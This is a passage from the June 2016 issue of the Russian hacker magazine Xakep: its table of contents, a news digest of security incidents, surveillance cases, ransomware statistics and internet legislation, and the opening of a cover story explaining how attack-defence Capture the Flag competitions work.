                                                       ИЮНЬ 2016


              №209





                                                    Бэкапы
                                                               Android:
                                                      как работают,
   Cover                                                как взломать
   Story



                                              Делаем SQLi
                                                   в почтовый апп
                                                         от Mail.RuCAPTURE
THE FLAG           Скрываемся
                                                       от мировогоКак взлом стал спортивным состязанием
                                                  правительства
                                                      с Whonix :)
                                          июнь 2016
          № 209





  MEGANEWS
Всё новое за последний месяц

   Capture the Flag
Как взлом стал спортивным состязанием

  Гонки с тенями
Интервью с главным безопасником QIWI Кириллом «isox» Ермаковым

  Как дела у динозавров?
Тестируем любимые старые программы в современных условиях

  WWW2
Интересные веб-сервисы

  Чем Google Instant Apps грозят интернету
Колонка Андрея Письменного

  Глубокий интеллект
Как зародились нейросети и почему они изменят всё

  Карманный софт
Выпуск #20. Новинки Google

  10 причин получить права root
Когда и кому это действительно нужно

  Backups for fun and profit
Разбираемся с механизмами бэкапа Android и достаем из них данные

  Когда не нужен root
Расширяем функциональность Android, не имея прав суперпользователя

  Дайджест новостей за месяц
Android N DP2, самый маленький смартфон в мире и самый дешевый ноутбук

   Android N и борьба за безопасность
Колонка Евгения Зобнина

  Easy Hack
Хакерские секреты простых вещей

  Обзор эксплоитов
Анализ новых уязвимостей

   Vulners — Гугл для хакера
Как устроен лучший поисковик по уязвимостям и как им пользоваться

  Инжект для робота
Вскрываем почтовое приложение от Mail.Ru для Android

  Погружение в крипту. Часть IV. Современные зарубежные шифры
3DES, AES, Blowfish, IDEA и Threefish

  X-TOOLS
Софт для взлома и анализа безопасности

   Marcher: полная анатомия угрозы
Прослеживаем весь цикл хакерской атаки на пользователей е-банкинга

   Тест бесплатных антивирусов, часть 3
Проверяем боем Clam Sentinel, FortiClient, Tencent и NANO Антивирус

  Твой первый интернет вещей, часть 2
Завершение проекта: воспаряем к облакам

   Multi-OS Engine Technology
Кросс-платформенные приложения от Intel: ожидания и реальность

  Раздаем задачи по сервисам
Многопоточная разработка для Android, часть 2

  Модули для троянов и не только
Пишем приложения с поддержкой плагинов для Android. Часть 2

  Задачи на собеседованиях
Ответы на задачи от компании ABBYY и награждение победителя

  Приручаем терминал
Как магия консоли позволяет сделать data engineering проще. Часть 2

  Виртуальные анонимы
Знакомимся с анонимизирующей операционкой Whonix

  Накатываем ось
Разбираемся с сервером установки Сobbler

  Wine наоборот
Windows Subsystem for Linux как оно есть

  Работа, работа, перейди на Puppet
История использования Puppet + Foreman

  FAQ
Вопросы и ответы

  Титры
Кто делает этот журнал
                                        Мария «Mifrill» Нефедова
                                                     nefedova.maria@gameland.ru

Май 2016-го был удивительно насыщен стол-
кновениями хакеров, пентестеров, ИБ-ис-
следователей и просто ИТ-активистов с дей-
ствиями властей. Мы надеемся, что это
не становится новой тенденцией, и публикуем
для тебя подборку этих майских эпизодов —
как смешных, так и серьезных.





КАК ВЗЛОМАЛИ
TELEGRAM
В начале марта произошел публичный конфликт между ФБК, Telegram и МТС:
двое оппозиционеров пожаловались, что их аккаунты в Telegram были взлома-
ны путем перехвата SMS-сообщений двухфакторной авторизации, в резуль-
тате чего неизвестные получили доступ к переписке. Как рассказал в своем
Facebook один из пострадавших, Олег Козловский, события развивались сле-
дующим образом.


• В 2:25 ночи отдел технологической безопасности МТС отключает мне сер-
   вис доставки SMS-сообщений.
•  Через 15 минут, в 2:40, кто-то с Unix-консоли по IP-адресу 162.247.72.27
   (это один из серверов анонимайзера Tor) отправил в Telegram запрос на ав-
   торизацию нового устройства с моим номером телефона.
• Мне было отправлено SMS с кодом, которое доставлено не было (сервис
   для меня отключен).
• В 3:08 злоумышленник вводит код авторизации и получает доступ к моему
   аккаунту. Telegram присылает мне автоматическое уведомление об этом
   (которое я прочитаю только утром).
• В 3:12 аналогичным образом с того же IP-адреса (т. е. через ту же сессию
   Tor) взламывается аккаунт Жоры Албурова.
• В 4:55 отдел технологической безопасности МТС вновь включает мне сер-
   вис доставки SMS.
•  Причину отключения и включения сервиса МТС мне назвать отказалось,
   предложив написать письменный запрос.

Главный вопрос в том, каким образом неизвестные получили доступ к коду, ко-
торый был отправлен на SMS, но не доставлен. К сожалению, у меня есть только
одна версия: через систему СОРМ или напрямую через отдел техбезопасности
МТС (например, по звонку из «компетентных органов»).


Сотрудники Telegram моментально подключились к расследованию взлома.
Они опубликовали сервисные логи и другую доступную информацию. Павел
Дуров в комментариях «Эху Москвы» переложил всю вину на сотового опера-
тора, объявив, что уведомления были отключены по запросу спецслужб.


Судя по всему, спецслужбы РФ решили начать давить на операторов связи,
чтобы те стали осуществлять перехват авторизационного SMS-кода. Обычно
такое встречается только в рамках людоедских, не заботящихся о своей репу-
тации режимах — Средняя Азия, иногда Ближний Восток. Но внезапно случи-
лось в России (если, конечно, отсечь коррупцию внутри МТС, что в случае с оп-
позиционными журналистами маловероятно).
   Рекомендацию для жителей проблемных стран я уже опубликовал; также бу-
дем делать массовую Телеграм-рассылку по России с советом всем находя-
щимся под угрозой пользователям включать двухфакторную авторизацию, так
как операторы связи РФ как верификатор ненадежны.


Представители МТС, в свою очередь, отвергли все претензии и заявили, что
«никаких целенаправленных действий по отключению услуг не производилось,
информация об отключении услуги сотрудником МТС не соответствует дей-
ствительности». В компании допускают, что это могла быть «вирусная атака»
или же доступ к аккаунту был «получен через веб-интерфейс». Эти заявления
плохо сочетаются с информацией, предоставленной пострадавшим сотрудни-
ком техподдержки МТС в ходе расследования, а также с официальным счетом
за услуги, который пострадавшие смогли получить у МТС. Официально рассле-
довать инцидент российские власти не стали, и теперь остается только верить
на слово одной или другой стороне.
  К делу вскоре подключились и российские компании-безопасники — к при-
меру, в Positive Technologies описали подробный PoC получения подобного
доступа без участия каких-либо спецслужб, СОРМ и помощи сотового опера-
тора: для этого оказалось достаточно воспользоваться широко известной уяз-
вимостью мобильного протокола SS7.

              10 000 000 $8 000
                                 атак в день переживает
                            инфраструктура Microsoft
                                                Специалисты по безопасностииз 000 000                                                  Microsoftобнародовали большой от-
    потеряла компания                чет (198 страниц), рассказывающий
                                              о различных угрозах, с которыми им     Microsoft на своем
  «эксперименте» с Nokia            приходится сталкиваться. Под самым                                           большим давлением оказалась служ-
     25 мая 2016 года компания                  ба Microsoft Account, ранее извест-
   Microsoft окончательно признала, что             ная как Windows Live ID. Этот сервис
  приобретение Nokia было неудачным              отвечает за авторизацию пользова-
  опытом. Microsoft сообщила о скором             телей Bing, Outlook.com, OneDrive,
  расформировании мобильного под-             Windows Phone, Skype, Xbox Live,
   разделения: были списаны еще 950             Windows 8.1, Windows 10 и так далее.
  миллионов долларов убытков и грядет           На втором месте стоит Azure Active
  сокращение 1850 рабочих мест.                    Directory (AAD) — коммерческая плат-
        Microsoft приобрела Nokia за              форма, через которую осуществляет-
   7,2 миллиарда долларов в 2013 году.             ся работа с Office 365, Workday, Box и
  За прошедшие годы наладить работу             тысячами облачных приложений. AAD
  подразделения и сделать мобильный             пользуются в 90% из 2000 крупней-
  бизнес прибыльным так и не удалось.           ших компаний мира, то есть сервис
  Журналисты издания TheVerge подсчи-            работает приблизительно с 550 мил-
   тали, что расходы Microsoft на реструк-          лионами пользователей.
  туризацию Nokia и попытки заставить             Согласно отчету, сервисы Microsoft
  бизнес работать достигли 7,6 милли-             обрабатывают 13 миллиардов ау-
  арда долларов. Учитывая грядущую              тентификационных запросов в день
  ликвидацию, которая тоже потребует               (на AAD приходится 1,3 миллиона) и
   денег, итоговые убытки корпорации со-           порядка 10 миллионов из них — это
   ставят приблизительно 8 миллиардов.             кибератаки.





78% САЙТОВ НА БАЗЕ WORDPRESS ПОДВЕРГАЛИСЬ
ЗАРАЖЕНИЮ В ПЕРВОМ КВАРТАЛЕ 2016 ГОДА

   Исследователи компании Sucuri представили отчет за первый квартал 2016 года , расска-
зывающий о распределении угроз между популярными CMS. Аналитики рассмотрели четыре
платформы: WordPress, Joomla, Drupal и Magento. Выяснилось, что хуже всего приходится
ресурсам на WordPress.

Из более 11 тысяч изученных зараженных сайтов 75% работают на WordPress
56% сайтов на WordPress используют устаревшую версиюCMS

Устаревшее ПО установлено на        25% атак на WordPress связаны
                                           с уязвимостями в трех плагинах:85% сайтов под управлением Joomla,                                                 RevSlider, Gravity Forms и TimThumb
97% сайтов на базе Magento и
81% сайтов на Drupal
Чаще всего хакеры атакуют сайты на WordPress, Joomla и Magento

В первом квартале 2016 года компрометации подверглись
78% сайтов на WordPress (8900 ресурсов)
и 15% — на базе Joomla (1600 ресурсов)


Сводная статистика по скомпрометированным в первом квартале 2016 года ресурсам:





ПРОТИВ СИСТЕМЫ
Тринадцатилетний исследователь Яни из Финляндии обнаружил се-
рьезный баг в Instagram. Представители Facebook решили удостоить юное
дарование денежным призом в размере 10 тысяч долларов, о чем тут же на-
писали финские газеты. Яни рассказал журналистам, как проверял проблему
на специальном тестовом аккаунте, подчеркнув, что мог бы стереть сообщения
«даже Джастина Бибера».
  В США сорокатрехлетний основатель Liberty Reserve Артур Будов-
ский был приговорен к двадцати годам тюремного заключения. Liberty
Reserve была централизованной анонимной платежной системой, которая по-
зволяла вводить и выводить реальные деньги, не проверяя указанные данные.
Из-за этого она превратилась в популярный метод отмывания незаконных до-
ходов и активно использовалась разного рода киберпреступниками, мошенни-
ками и устроителями финансовых пирамид.
  В Словении студент наконец добился внимания властей к своей на-
ходке — уязвимости в полицейском протоколе TETRA — и, вероятно, тут
же пожалел об этом. Два года власти игнорировали Деяна Орнига, когда он пы-
тался сообщить о проблеме по различным каналам. Зато когда Орниг опубли-
ковал результаты своих изысканий в свободном доступе, правоохранительные
органы тут же выдвинули против него множество обвинений (взлом, перехват
данных, подделка документов), изъяли компьютер и приговорили к 15 месяцам
условно. Поражены твоей неудачей, Деян!
  К исследователю Джастину Шаферу из США ранним майским утром
нагрянуло больше десятка вооруженных агентов ФБР. Это нежелатель-
ное внимание он получил, сообщив о проблеме на FTP-сервере компании
Eaglesoft, которая обслуживает стоматологические клиники. Таким способом
компания решила «отблагодарить» исследователя за найденную уязвимость.
Любопытно, что эта уязвимость была закрыта, а информация о ней официально
опубликована институтом Карнеги — Меллона еще в феврале, что никак не по-
мешало Eaglesoft два месяца спустя обвинить Шафера во взломе сервера.
  В Швеции правообладатели, при поддержке местных властей, пла-
номерно «вычищают» рынок: Эуген Арчи, владелец сайта Undertexter.se,
созданного энтузиастами десять лет назад для перевода субтитров к фильмам,
уже три года подвергается юридическим преследованиям голливудских студий.
Казалось бы, авторы ресурса не делали ничего дурного и точно не нарушали
ничьих авторских прав, однако сайт закрыли, полиция изъяла серверы, а Арчи
был арестован. Причем правообладателям недостаточно и этого: обвинители
выбрали несколько десятков фильмов, вокруг которых смогли гарантированно
выстроить дело, и настаивают на лишении Эугена Арчи свободы.



                 «Раньше продажа утечек данных была
                   покрыта завесой тайны. Сегодня это
                 обычный товар. Данные пользователей
                      LinkedIn выставлены на продажу не толь-
                    ко в даркнете, их также предлагают ре-
                    сурсы, подобныеLeakedSource, которые
                  по подписке продают доступ к данным.
                    Утечки данных попадают в заголовки но-
                   востей каждый день, из-за чего в социу-
                ме уже выработался иммунитет к такому».

                                                                 основатель агрегатора утечек «Have I BeenPwned?»                                             Трой Хант,





ОТКРЫТИЯ МЕСЯЦА
Корпорация IBM в мае открыла бесплатный публичный доступ к постро-
енному ей универсальному квантовому компьютеру и разрешила экс-
периментировать с квантовыми алгоритмами. Считается, что универсальные
квантовые компьютеры вскоре позволят решать задачи, которые не под силу
обычным компьютерам, — например, разложение чисел на простые множите-
ли, которое заложено в основу криптографических систем с открытым ключом.
Конечно, устройству пока не хватает мощности, чтобы взламывать криптошиф-
ры, но в IBM планируют увеличить мощность в 10–20 раз в течение десяти лет.
  Pornhub объявил о запуске собственной программы bug bounty. Пор-
носайт готов заплатить исследователям за уязвимости от 50 до 25 000 долларов.
Официальная программа вознаграждений работает на платформе HackerOne.
Pornhub оказался в интересной компании: в последние месяцы с аналогичны-
ми начинаниями выступили Uber, Tor и даже Пентагон.
  Компания Facebook в мае обнародовала исходные коды платформы
Capture the Flag под лицензией Creative Commons. Соревнования в формате
CTF — любимая многими хакерами часть всех конференций и форумов, посвя-
щенных информационной безопасности. Такие конкурсы дают возможность
отточить свои умения в области взлома, не опасаясь потом сесть за это в тюрь-
му (подробнее читай в теме номера). Исходники, предоставленные разработ-
чиками из Facebook, включают все, что нужно для проведения хакерского со-
ревнования: игровые «карты», систему подсчета баллов, систему регистрации
команд и многое другое.
  В России запущена первая биржа для продажи уязвимостей гос-
структурам, спецслужбам и компаниям, связанным с ИБ. Основатель
биржи Expocod, бывший сотрудник Росфинмониторинга Андрей Шорохов рас-
сказал журналистам, что ранее он работал в финансовой разведке в управле-
нии финансовых расследований Росфинмониторинга, где специализировался
как раз на расследовании высокотехнологичных преступлений. Помимо Шоро-
хова, в команду проекта входят бывшие хакеры и специалисты по информаци-
онной безопасности.


САМЫЕ АКТИВНЫЕ ХАКТИВИСТЫ 2016 ГОДА

   Исследователи компании SurfWatch Labs, которая занимается сбором и анализом инфор-
мации из социальных сетей, составили «рейтинг» самых заметных хактивистских кампаний
2016 года. Также эксперты определили, какие группы были более активны в указанный период,
хотя интерес к хактивизму в целом снизился за последние годы. По мнению исследователей,
Anonymous были и останутся самой трендовой группой 2016 года, особенно учитывая, что кампа-
нии Anonymous получают активную поддержку команд New World Hacking и Ghost Squad Hacker.

Топовые группы хактивистов в 2016 году:





Самые заметные операции Anonymous в 2016 году:
                                        Мария «Mifrill» Нефедова
                                                     nefedova.maria@gameland.ru





ФАКАПЫ МЕСЯЦА
Эксперт Google Тевис Орманди со смехом рассказал, что обнаружил
проблемы с безопасностью в умных весах. Умная техника для дома часто
оказывается весьма опасной: в прошлом году исследователи находили в ко-
феварках и электрочайниках уязвимости, через которые злоумышленники мог-
ли узнать пароль от вайфая жертвы. В мае этого года отличились умные весы
фирмы Fitbit, которые позволяли получить неограниченный доступ к домашней
сети. Разработчики из Fitbit уже выпустили обновление, которое все весы полу-
чат автоматически.
  15 мая свою работу прекратил известный ресурс PwnedList — один
из лидирующих агрегаторов скомпрометированных данных, суще-
ствовавший с 2012 года. PwnedList позволял проверить свои учетные данные
по огромной базе (866 434 472 аккаунта) на предмет компрометации. К сожа-
лению, уязвимость обнаружили в базе самого агрегатора. Оказалось, что зло-
умышленники могут вытянуть с PwnedList вообще всю информацию обо всех
866 миллионах аккаунтов. Узнав об этом, владельцы PwnedList объявили, что
закрывают сервис.
   Хакер, известный под псевдонимом BVM, от скуки взломал Reddit.
За пару недель мая оказались взломаны и дефейснуты десятки подреддитов,
включая популярнейшие r/pics, r/starwars и r/gameofthrones. Сам BVM гово-
рит, что «сбился со счета», суммарно взломав более 70 разных подсайтов.
Он утверждает, что причиной стала скука и «дерьмовая безопасность Reddit».
Взломщик отказался раскрыть методы и инструменты, которые он использовал
для атак. Работу дефейсера существенно облегчило отсутствие двухфактор-
ной аутентификации.
  Компания Bitdefender в мае сообщила об обнаружении крупного
ботнета под названием Million-Machine. Название не врет: образующих его
машин действительно оказалось почти миллион. Ботнет, впрочем, безопасен
для пользователей: его целью служила генерация рекламных доходов. Вредо-
носная программа, лежащая в основе ботнета, использовала зараженные вер-
сии таких популярных приложений, как WinRAR, YouTube Downloader, Connectify,
KMSPico и Stardock Start8. Попав на компьютер жертвы, она добавляла себя
в список автозапуска в реестре, заворачивала все соединения на локальный
прокси на порту 9090 и перехватывала клики по рекламе, доход от которых ухо-
дил авторам ботнета.
  В Японии воскресным утром 15 мая группа преступников численно-
стью около ста человек за три часа похитила 12,7 миллиона долларов
из банкоматов в шестнадцати разных префектурах страны. Японская полиция
пишет, что эта серия атак была работой скоординированной международной
преступной группы. Мошенники действовали слаженно и суммарно обокрали
около 1400 банкоматов. Для снятия денег мошенники использовали клоны чу-
жих банковских карт — в основном карты южноафриканского банка Standard
Bank.
  Камерунец Эрик Донис Симу налетал на два миллиона долларов:
такое обвинение выдвинуло министерство юстиции США. В 2011 году путем
рассылки фишинговых писем Симу получил доступ к глобальной дистрибью-
торской системе (GDS), которая используется во всем мире для покупки и бро-
нирования авиабилетов авиакомпаниями и туристическими фирмами. Каме-
рунец оставался незамеченным почти три года, успев «купить» и использовать
огромное количество авиабилетов. По некоторым он летал сам, другие пере-
продавал за бесценок. В 2014 году камерунца с фальшивым паспортом аре-
стовали в Париже, после чего его преступление и стало известно.

 65%
   россиян предпочтут
    кражу откровенных                         В             раз
   фото краже данных о                              использование60TFTP-    банковском счете                              серверов усиливает
     Интересный опрос провели иссле-             DDoS   дователи компании Avast. Они погово-
                                                Около трех месяцев назад иссле-  рили с российскими пользователями
                                                 дователь из Эдинбургского универси-  о безопасности в интернете и утечках
                                                     тета Непера опубликовал документ, в   данных. Как выяснилось, 97% респон-
                                               котором описывал, как в теории можно   дентов уверены, что они используют
                                                 организовать отраженную DDoS-атаку  надежный пароль, хотя действительно
                                                 с применением TFTP-серверов. Теперь  безопасными паролями могут похва-
                                               специалисты компании Akamai обнару-   статься лишь 4% опрошенных. Од-
                                            жили такие атаки в реальной жизни.  новременно с этим 33% российских
                                                  Тогда как обычные методы отражения   пользователей вообще не имеют па-
                                             и усиления атак дают прирост мощ-  роля на своих смартфонах, хотя 84%
                                                  ность лишь в 2–10 раз, использование   респондентов опасаются за свои лич-
                                                TFTP-серверов позволяет увеличить  ные данные. Более 50% пользователей
                                             мощность DDoS-атак в 60 раз. Иссле-  не меняют пароли никогда или делают
                                                дователи уже зафиксировали атаки,   это очень редко. И самое парадоксаль-
                                                пиковая мощность которых достигала   ное: 65% респондентов признались,
                                                    1,2 Гбит/с (176 400 пакетов в секунду).   что легче перенесут утечку собствен-
                                        Еще в марте 2016 года исследователь  ных фотографий в обнаженном виде,
                                                 университета Непера сумел обнару-  нежели расстанутся с банковской ин-
                                                жить 599 600 доступных серверов, на  формацией. При этом, как отмечают
                                                которых открыт порт 69 (TFTP). Те-   исследователи Avast, пароли пользо-
                                               перь эксперты Akamai настоятельно   ватели чаще устанавливают именно на
                                              рекомендуют организациям прятать  приложения с фотографиями, а не на
                                               TFTP-серверы за брандмауэром.   банковские сервисы.





ЗАКОНОТВОРЧЕСТВО
В РУНЕТЕ
Координационный центр национального домена сети интернет (КЦ) на-
делил Роскомнадзор правом разделегировать в досудебном порядке
домены в зонах .ru и .рф. Напомним, что то же самое могут делать Управ-
ление «К» МВД и Генпрокуратура: они направляют письмо регистратору до-
менного имени, и тот может разделегировать домен; если он этого не сделает,
то домен будет разделегирован КЦ. Право на разделегацию без суда также
имеют четыре негосударственные организации, которые заключили соглаше-
ние с КЦ: «Лаборатория Касперского», Group-IB, Региональная общественная
организация «Центр интернет-технологий» (РОЦИТ) и НП «Лига безопасного
интернета».
  Минкомсвязи опубликовало поправки к госпрограмме «Информа-
ционное общество», которые касаются защиты российской интернет-ин-
фраструктуры. Планы Минкомсвязи амбициозны: к 2020 году 99% российско-
го интернет-трафика должно передаваться внутри страны, то есть РФ будет
дублировать всю критическую инфраструктуру интернета. Учитывая, что в 2014
году этот показатель равнялся нулю, сроки выглядят очень сжатыми. Правда,
документ не поясняет, что именно подразумевается под «критической инфра-
структурой».
  Представители Росфинмониторинга инициировали обсуждение
идеи разработки национальной криптовалюты РФ с представителями
банков, Минфина и ЦБ. С ключевыми особенностями будущей валюты в ведом-
стве уже определились: российская криптовалюта не должна быть безэмисси-
онной (у нее будет эмитент, чья деятельность, скорее всего, будет лицензиро-
вана), обменивать рубли или иную валюту на криптовалюту можно будет только
через специальные электронные обменники по регламентированным прави-
лам, а личность приобретающего должна обязательно идентифицироваться.
Пресс-секретарь президента РФ Дмитрий Песков опровергает информацию
«Коммерсанта» и наличие таких обсуждений, что оставляет еще меньше со-
мнений в перспективах национальной криптовалюты.



                  «Все эти серверы в интернете, широ-
                   ко открытые всем желающим, работают
                  на устаревшем софте, которому более
                    двух лет, либо кто-то намеренно отклю-
                    чает на них механизмы защиты. Зачем
                 люди сами отказываются от безопасно-
                   сти? Полагаю, это делается просто ради
                    удобства. А нужно всего-то задать логин
                  и пароль, все в буквальном смысле на-
                   столько просто».

                                                                                           по стратегии,                                                Келли Стирман, вице-президент MongoDB
                                                                  о многочисленных утечках информации,
                                                                 связанных с неправильной настройкой MongoDB





ЦИФРЫ И ФАКТЫ
Журналисты Torrent Freak решили посчитать, сколько The Pirate Bay за-
рабатывает на «тайных» пожертвованиях. В 2013 году правообладатели
в лице RIAA усмотрели в пожертвованиях биткойнов большую опасность: «В этих
платежах не участвует ни один банк или центральный орган власти, и отследить
или конфисковать биткойны практически невозможно», — писали представи-
тели RIAA. Как оказалось, за последний год функцией воспользовались всего
376 человек, суммарно переслав трекеру 8,21 BTC (примерно 3500 долларов
по текущему курсу, или 9,34 доллара в сутки). Интересно, покусится ли RIAA
на эти огромные суммы.
  Корпорация Microsoft опубликовала отчет о вредоносном программ-
ном обеспечении и других угрозах, наблюдавшихся во второй половине
2015 года. Россия удостоилась особого упоминания сразу в нескольких раз-
делах. По данным Microsoft, в нашей стране очень редко используют антивиру-
сы (реже только в Китае) и сильно страдают от вредоносного софта, который
встречается в России примерно на 33% чаще, чем в среднем по миру. Также
Россия входит в первую тройку стран, где размещены сайты, распространяю-
щие вредоносный софт через браузерные уязвимости.
  Национальный институт стандартов и технологий США (NIST) опу-
бликовал отчет о постквантовой криптографии. В нем обсуждается подго-
товка к появлению квантовых компьютеров, с легкостью взламывающих любые
современные криптосистемы. Эксперты NIST полагают, что принимать меры
нужно уже сейчас, иначе будет поздно: квантовые компьютеры, способные
взламывать любые современные криптосистемы с открытым ключом, появятся
в течение ближайших двадцати лет. По оценке специалистов NIST, к 2030 году
взлом алгоритма RSA с ключом длиной 2000 бит будет занимать считаные часы.
  9 мая Международный консорциум журналистских расследований
(ICIJ) опубликовал интерактивную базу данных «Панамского архива»,
которая содержит подробную информацию более чем о 214 тысячах офшоров.
База сопровождается интерактивным перечнем всех офшоров, «засветивших-
ся» в документах Mossack Fonseca, а также данные об их владельцах. Доступен
поиск по названиям компаний, именам людей, адресам, странам и юрисдикци-
ям. База предлагает удобную визуализацию, наглядно демонстрируя, как одни
компании или люди связаны с другими. Также ICIJ предлагают всем желающим
офлайновую копию, которую можно скачать через торрент или напрямую с сай-
та.
  Продолжают появляться новые подробности о массовой облаве
на педофилов в даркнете, которую ФБР провело в 2015 году. Были об-
народованы новые судебные материалы, объясняющие, как ФБР удалось до-
браться до инфраструктуры сайта Playpen. Судя по всему, личную информацию
о себе администратор Playpen слил сам. Он заходил на сервер, а также опла-
чивал услуги зарубежного хостинг-провайдера через PayPal напрямую со сво-
его домашнего IP-адреса, не используя Tor. Этого оказалось достаточно.
  Издание  Intercept,  уже  ставшее  своеобразным  преемником
Wikileaks, начало публикацию секретных документов, полученных от Эд-
варда Сноудена. Первая партия бумаг уже выложена в открытый доступ: в нее
вошли 166 документов, датированных 2003 годом. Среди бумаг можно найти
как сверхсекретные отчеты о программах слежения АНБ, так и рутинные дан-
ные о поездках сотрудников ведомства. Файлы можно читать прямо на сайте
либо скачать единым архивом. Каждый документ сопровождается кратким из-
ложением его содержания.
  У федеральных ведомств США настоящая беда с IT-инфраструкту-
рой. Счетная палата США опубликовала отчет, из которого выяснилось, что
американское правительство ежегодно тратит на эксплуатацию и обслужива-
ние устаревших систем порядка 75% IT-бюджета (61 миллиард долларов в 2015
году), но при этом многие ведомства по-прежнему эксплуатируют устаревшую
технику. Минюст США использует в работе язык COBOL 1959 года рождения,
системы минбезопасности США работают на Windows Server 2003, а ядерный
арсенал минобороны США контролируется компьютерами типа IBM Series/1
семидесятых годов, с восьмидюймовыми дискетами. Вот уж воистину, «рабо-
тает — не трогай».


ТРОЯНЫ-ВЫМОГАТЕЛИ СТАНОВЯТСЯ НАСТОЯЩИМ
БЕДСТВИЕМ

   В этом месяце сразу ряд компаний отметили значительный прирост криптовымогателей,
которые стали одной из основных угроз в последнее время. Так, исследователи компании
ESG пишут, что в апреле 2016 года вымогатели продемонстрировали в США рекордный рост:
158,87% за месяц. Представила свой отчет и «Лаборатория Касперского», сообщив, что в пер-
вом квартале были предотвращены атаки на 34 900 устройств и обнаружено 2800 мобильных
троянов-вымогателей. При этом опрос 5000 респондентов из США и Канады выявил, что люди
почти ничего не знают о вымогательском ПО.

Аналитики CERT-ROсоставили схему , на которой хорошо виден прирост вымогателей, начиная
с 2015 года:





На сегодняшний день в коллекции «Лаборатории Касперского» содержится
около 15 000 модификаций троянов-шифровальщиков


В первом квартале 2016 года «Лаборатория Касперского» обнаружила
2900 новых модификаций и 9 новых семейств шифровальщиков


Самыми распространенными шифровальщиками являются:
Teslacrypt (58,43%), CTB-Locker (23,49%) и Cryptowall/Cryptodef (3,41%)
В первом квартале 2016 года шифровальщиками было атаковано 372 602 уникальных
пользователя (на 30% больше, чем в прошлом квартале):





43% пользователей в США и Канаде не знают, что такое трояны-вымогатели.
9% опрошенных сочли, что это как-то связано с похищением аккаунтов в соцсетях
15% американцев и 17% канадцев считают, что троян можно «победить», вытащив блок
питания ПК из розетки или выключив мобильное устройство
46% опрошенных признали, что не знают, что предпринять в случае заражения
Заплатить выкуп готовы 24% опрошенных, но 53% категорически не хотят отправлять
деньги злоумышленникам
84% респондентов утверждают, что регулярно делают резервные копии своих файлов
COVERSTORY


CAPTURE
                                                                              Аркадий Литвиненко
                                                                                                    aka Betepok
                                                                                         постоянный участник CTF
                                                                                              c пятилетним опытом
                                                                                                      участия, представитель
                                                                                      команды BalalaikaCr3w
                                                                                      и LC↯BC (объединение
                                                                                         More Smoked Leet
                                                                                                  Chicken и BalalaikaCr3w)THE FLAG

 КАК ВЗЛОМ СТАЛ СПОРТИВНЫМ СОСТЯЗАНИЕМ




 Capture the Flag (CTF) — это игра, в которой участники
пытаются захватить флаг противников и защитить свой.
Популярной ее сделали командные шутеры вроде Quake
и Team Fortress, но в какой-то момент хакерам пришла
идея спроецировать CTF на информационную безопас-
 ность. О том, как выглядит результат, и пойдет речь в этой
 статье.

 Хакерский CTF хоть и построен на правилах классического Capture the Flag,
 однако с годами очень сильно видоизменился. Сейчас CTF в контексте ин-
 формационной безопасности может означать даже соревнования, которые
 далеки от обычного захвата флага. Множественные эксперименты с правила-
 ми и механикой проведения привели к появлению массы типов и разновидно-
 стей CTF. Вот основные из них.





                                                          CTF на PHDays 2016

ATTACK-DEFENCE
 Этот  вид CTF  считается  классическим,  поскольку  использует  правила
 Capture the Flag в чистом виде. Организаторы выдают командам некий образ
 (vulnbox) — чаще всего это виртуалка, но может быть ноутбук, сервер или уда-
 ленный доступ к чему-то. Там развернута система, а в ней — несколько серви-
 сов, которые написаны на разных языках программирования. Причем написа-
 ны так, чтобы в них имелись множественные уязвимости.
   У команд обычно есть абсолютные права на виртуалке, хотя встречаются
 и частные случаи, когда доступ ограниченный, например — DEF CON. Образы
 обязательно полностью одинаковые, а соответственно, и уязвимости в серви-
 сах — тоже. Основная идея CTF — искать уязвимости в своей системе и ата-
 ковать чужие. Почти всегда vulnbox — это дистрибутив *nix.
    Хоть все сервисы и должны быть написаны на разных языках, кое-что оди-
 наковое у них есть: к каждому можно получить доступ извне. Например, это
 может быть веб-сервер, написанный на Python с использованием Flask или
 Django, либо скомпилированный бинарный файл (зачастую без исходников),
 который слушает какой-нибудь порт и выполняет определенные действия. Ко-
 роче, все, что может прийти на ум организаторам.
   Иногда даже приходится писать свои сервисы с нуля — это отступление
 от классической модели CTF, но такое тоже встречается. В этом случае на ка-
 кой-то порт сыплются определенные пакеты, а участники должны написать об-
 работчик для них.
   Как организаторы узнают, что тот или иной сервис взломан? В этом им по-
 могают проверочные боты. Они имитируют действия легитимного пользова-
 теля, который применяет сервис по назначению. Каждый раунд бот каким-то
 особым для каждого сервиса образом отправляет на него некую секретную
 информацию. Эта информация и является флагом. На следующий раунд бот
 приходит и проверяет, доступен ли предыдущий флаг и верен ли он, а затем
 ставит новый. Организаторы таким образом узнают, что сервис работает кор-
 ректно. Продолжительность и количество раундов описываются в правилах
 и могут варьироваться от игры к игре.
   Вот пример того, как действует бот. Представь, что есть сервис, который
 имитирует работу почтового сервера. Бот подключается, регистрирует но-
 вый почтовый ящик и сам себе отправляет сообщение, в котором содержится
 флаг. На следующий раунд бот заходит под ранее зарегистрированным акка-
 унтом и читает флаг, отправленный в предыдущем раунде. Если флаг сходится
 с тем, который содержится у него в базе, то бот считает, что сервис работа-
 ет верно. После этого он снова регистрирует учетную запись и повторяет все
 с начала.
   Успешная атака — это обнаружение уязвимостей, которые позволят чи-
 тать чужие сообщения. Если команда находит такую уязвимость, то она сможет
 прочесть сообщение бота и таким образом захватить флаг.
    Случается, что бот не может забрать флаг с предыдущего раунда. Напри-
 мер, виртуалка упала, либо команда сделала кривые исправления сервиса,
 либо другая команда с помощью уязвимости удалила или изменила этот флаг.
 Тогда организаторы считают, что сервис у команды недоступен. Пока сервис
 работает корректно, команда получает очки за защиту. Если нет, то в раунды
 его недоступности не получает ничего.
   Помимо очков за защиту, есть второй вид очков — за атаку. Они начисля-
 ются за сдачу флагов, которые хранятся в сервисах других команд. Формулы
 для расчета этих очков очень сильно разнятся от соревнования к соревнова-
 нию. В формулу, к примеру, может быть заложено число команд, которые тоже
 украли этот флаг, а может и не быть. Часто еще учитывается место в рейтинге
 команды, у которой был украден флаг.
   Любое изменение формулы подсчета очков очень сильно влияет на меха-
 нику игры. Например, если члены одной команды первыми нашли уязвимость
 и написали к ней эксплоит, то зачастую есть смысл атаковать только слабые
 команды, поскольку сильные могут проанализировать трафик и украсть экс-
 плоит. Зато если в формуле учитывается ранг команды и за сильные будут да-
 вать значительно больше очков, то эта тактика может оказаться невыгодной.
 Еще часто встречается правило, что команды не могут сдавать флаги за сер-
 висы, которые у них самих недоступны.
   Коэффициент, который соответствует числу команд, также укравших этот
